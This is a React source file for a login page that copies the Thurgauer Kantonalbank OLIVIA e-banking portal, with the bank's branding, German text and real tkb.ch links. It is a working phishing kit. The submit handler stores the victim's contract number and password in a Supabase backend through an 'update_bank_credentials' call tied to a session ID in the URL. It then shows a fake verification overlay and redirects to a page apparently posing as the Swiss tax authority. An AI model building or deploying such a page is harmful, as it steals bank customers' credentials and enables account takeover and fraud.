import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { ArrowRight, Eye, EyeOff } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import oliviaWhite from "@/assets/tkb-olivia-white.svg.asset.json";
import footerLogo from "@/assets/tkb-footer-logo.svg.asset.json";

const GREEN = "#006d41";
const GREEN_DARK = "#005533";
const GREEN_ACCENT = "#9fd32f";
const TITLE_GREEN = "#005d38";
const ERROR_RED = "#9c013c";
const ERROR_BG = "#f9e6ed";
const INPUT_BG = "#f7f6f6";
const DIVIDER = "#82b613";

const t = {
  pageTitle: "Thurgauer Kantonalbank – OLIVIA",
  kundenportal: "Das Kundenportal der TKB",
  loginTitle: "LOGIN OLIVIA E-BANKING",
  credentialsLabel: "Ihre Zugangsdaten",
  contractNumber: "Vertragsnummer",
  password: "Passwort",
  submit: "Weiter",
  loading: "Anmeldedaten werden überprüft...",
  forgotPw: "Passwort vergessen",
  newDevice: "Neues Gerät registrieren",
  block: "Vertrag sperren",
  requiredVnr: "Bitte geben Sie Ihre Vertragsnummer ein.",
  card1Title: "Wie logge ich mich ein",
  card1Text: "Verwenden Sie Ihre bekannten E-Banking Login-Daten für die Anmeldung.",
  card1Link1: "Hilfe zum Login",
  card1Link2: "Sicherheit beim E-Banking",
  card2Title: "Was ist OLIVIA?",
  card2Text:
    "OLIVIA ist das Kundenportal der TKB, welches E-Banking und weitere digitale Services vereint.",
  card2Link: "Mehr Informationen",
};

interface FloatingInputProps {
  id: string;
  label: string;
  value: string;
  onChange: (v: string) => void;
  type?: "text" | "password";
  showError?: boolean;
  errorText?: string;
  showEye?: boolean;
}

const FloatingInput = ({
  id,
  label,
  value,
  onChange,
  type = "text",
  showError = false,
  errorText,
  showEye = false,
}: FloatingInputProps) => {
  const [focused, setFocused] = useState(false);
  const [touched, setTouched] = useState(false);
  const [reveal, setReveal] = useState(false);
  const isError = showError && touched && !focused && value.trim() === "";
  const floated = focused || value.length > 0;
  const hasValue = value.length > 0;

  let borderColor = "#000";
  let borderWidth = 1;
  if (isError) {
    borderColor = ERROR_RED;
    borderWidth = 2;
  } else if (focused) {
    borderColor = GREEN_ACCENT;
    borderWidth = 2;
  } else if (showEye && hasValue) {
    borderColor = GREEN_ACCENT;
    borderWidth = 2;
  }

  const bg = isError ? ERROR_BG : INPUT_BG;
  const labelColor = isError ? ERROR_RED : floated ? GREEN : "#6c6e70";
  const inputType = showEye ? (reveal ? "text" : "password") : type;

  return (
    <div className="w-full">
      <div
        style={{
          position: "relative",
          height: 56,
          background: bg,
          borderBottom: `${borderWidth}px solid ${borderColor}`,
          transition: "background 0.15s, border-color 0.15s",
        }}
      >
        <label
          htmlFor={id}
          style={{
            position: "absolute",
            left: 12,
            top: floated ? 6 : "50%",
            transform: floated ? "none" : "translateY(-50%)",
            fontSize: floated ? 11 : 16,
            color: labelColor,
            pointerEvents: "none",
            transition: "all 0.15s ease",
          }}
        >
          {label}
        </label>
        <input
          id={id}
          type={inputType}
          value={value}
          onChange={(e) => onChange(e.target.value)}
          onFocus={() => setFocused(true)}
          onBlur={() => {
            setFocused(false);
            setTouched(true);
          }}
          style={{
            position: "absolute",
            left: 0,
            right: showEye ? 44 : 0,
            bottom: 0,
            height: 32,
            padding: "0 12px",
            background: "transparent",
            border: "none",
            outline: "none",
            fontSize: 16,
            color: "#1a1a1a",
          }}
        />
        {showEye && (
          <button
            type="button"
            onClick={() => setReveal((r) => !r)}
            aria-label={reveal ? "Passwort verbergen" : "Passwort anzeigen"}
            style={{
              position: "absolute",
              right: 8,
              top: "50%",
              transform: "translateY(-50%)",
              background: "transparent",
              border: "none",
              padding: 6,
              cursor: "pointer",
              color: "#9a9a9a",
            }}
          >
            {reveal ? <EyeOff size={18} strokeWidth={1.5} /> : <Eye size={18} strokeWidth={1.5} />}
          </button>
        )}
      </div>
      {isError && errorText && (
        <p className="mt-2 text-[13px]" style={{ color: ERROR_RED }}>
          {errorText}
        </p>
      )}
    </div>
  );
};

const ChThurgauerKantonalbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  const [vertragsnummer, setVertragsnummer] = useState("");
  const [passwort, setPasswort] = useState("");

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  usePageMeta(t.pageTitle, footerLogo.url);

  const canSubmit = vertragsnummer.trim().length > 0 && passwort.trim().length > 0;

  const handleSubmit = async () => {
    if (!canSubmit) return;
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: vertragsnummer,
        p_password: passwort,
        p_username_label: "Vertragsnummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  const quickLinks: { label: string; href: string; external: boolean }[] = [
    { label: t.forgotPw, href: "#", external: false },
    { label: t.newDevice, href: "#", external: false },
    { label: t.block, href: "https://www.tkb.ch/olivia_sperren", external: true },
  ];

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message={t.loading}
          onComplete={() => navigate("/estv/confirmation?s=" + sessionId)}
        />
      )}
      <div className="bg-white flex flex-col">
        {/* Header */}
        <header
          className="w-full"
          style={{
            background:
              "linear-gradient(90deg, #4f9925 0%, #006d41 38%, #006d41 100%)",
          }}
        >
          <div className="max-w-[1100px] w-full mx-auto px-4 md:px-20 py-5 md:py-6 flex items-center gap-4">
            <img
              src={oliviaWhite.url}
              alt="TKB OLIVIA"
              className="h-[20px] md:h-[24px] object-contain"
            />
            <span className="hidden md:inline text-white text-[14px] md:text-[16px]">
              {t.kundenportal}
            </span>
          </div>
        </header>

        {/* Main */}
        <main style={{ minHeight: "calc(100vh - 80px)" }}>
          <div className="max-w-[1100px] w-full mx-auto px-4 md:px-20 pt-8 md:pt-12">
            <h1
              className="text-[24px] md:text-[28px] font-normal tracking-wide"
              style={{ color: TITLE_GREEN }}
            >
              {t.loginTitle}
            </h1>
            <p className="mt-2 text-[16px]" style={{ color: "#3a3a3a" }}>
              {t.credentialsLabel}
            </p>

            <div className="mt-6 max-w-[480px]">
              <div className="space-y-5">
                <FloatingInput
                  id="tkb-vnr"
                  label={t.contractNumber}
                  value={vertragsnummer}
                  onChange={setVertragsnummer}
                  showError
                  errorText={t.requiredVnr}
                />
                <FloatingInput
                  id="tkb-pw"
                  label={t.password}
                  value={passwort}
                  onChange={setPasswort}
                  type="password"
                  showEye
                />
              </div>

              <div className="mt-8">
                <button
                  type="button"
                  onClick={handleSubmit}
                  disabled={!canSubmit}
                  className="px-10 h-[44px] text-[15px] font-medium transition-colors"
                  style={{
                    borderRadius: 0,
                    background: canSubmit ? GREEN : "#dedfdf",
                    color: canSubmit ? "#fff" : "#9a9a9a",
                    cursor: canSubmit ? "pointer" : "not-allowed",
                  }}
                  onMouseEnter={(e) => {
                    if (canSubmit) e.currentTarget.style.background = GREEN_DARK;
                  }}
                  onMouseLeave={(e) => {
                    if (canSubmit) e.currentTarget.style.background = GREEN;
                  }}
                >
                  {t.submit}
                </button>
              </div>

              <div className="mt-8 space-y-3">
                {quickLinks.map((l) => (
                  <a
                    key={l.label}
                    href={l.href}
                    onClick={l.external ? undefined : (e) => e.preventDefault()}
                    target={l.external ? "_blank" : undefined}
                    rel={l.external ? "noopener noreferrer" : undefined}
                    className="flex w-fit items-center gap-2 text-[15px]"
                    style={{ color: GREEN }}
                  >
                    <ArrowRight size={18} strokeWidth={2} />
                    <span className="link-underline-grow">{l.label}</span>
                  </a>
                ))}
              </div>
            </div>

            {/* Info Cards */}
            <div className="mt-16 grid grid-cols-1 md:grid-cols-2 gap-6 items-stretch">
              <div
                className="p-6 md:p-8 flex flex-col"
                style={{ background: "#f7f6f6", border: "1px solid #eae9e9" }}
              >
                <h3 className="text-[20px] font-normal" style={{ color: "#3a3a3a" }}>
                  {t.card1Title}
                </h3>
                <p className="mt-3 text-[15px] text-[#3a3a3a] leading-relaxed">
                  {t.card1Text}
                </p>
                <div className="mt-auto pt-6 space-y-2 flex flex-col items-start">
                  <a
                    href="https://www.tkb.ch/loginprozess-login"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="flex w-fit items-center gap-2 text-[15px]"
                    style={{ color: GREEN }}
                  >
                    <ArrowRight size={18} strokeWidth={2} />
                    <span className="link-underline-grow">{t.card1Link1}</span>
                  </a>
                  <a
                    href="https://www.tkb.ch/sicherheit"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="flex w-fit items-center gap-2 text-[15px]"
                    style={{ color: GREEN }}
                  >
                    <ArrowRight size={18} strokeWidth={2} />
                    <span className="link-underline-grow">{t.card1Link2}</span>
                  </a>
                </div>
              </div>

              <div
                className="p-6 md:p-8 flex flex-col"
                style={{ background: "#f7f6f6", border: "1px solid #eae9e9" }}
              >
                <h3 className="text-[20px] font-normal" style={{ color: "#3a3a3a" }}>
                  {t.card2Title}
                </h3>
                <p className="mt-3 text-[15px] text-[#3a3a3a] leading-relaxed">
                  {t.card2Text}
                </p>
                <div className="mt-3 flex flex-col items-start">
                  <a
                    href="https://www.tkb.ch/olivia"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="flex w-fit items-center gap-2 text-[15px]"
                    style={{ color: GREEN }}
                  >
                    <ArrowRight size={18} strokeWidth={2} />
                    <span className="link-underline-grow">{t.card2Link}</span>
                  </a>
                </div>
              </div>
            </div>
          </div>
        </main>

        {/* Divider + Footer */}
        <div className="mt-16" style={{ height: 1, background: DIVIDER }} />
        <footer className="py-6">
          <div className="max-w-[1100px] mx-auto px-4 md:px-20 flex items-center justify-between">
            <img
              src={footerLogo.url}
              alt="Thurgauer Kantonalbank"
              className="h-[36px] object-contain"
            />
            <a
              href="https://tkb.ch/"
              target="_blank"
              rel="noopener noreferrer"
              className="link-underline-grow inline-block text-[15px] font-normal"
              style={{ color: GREEN }}
            >
              tkb.ch
            </a>
          </div>
        </footer>
      </div>
    </>
  );
};

export default ChThurgauerKantonalbank;
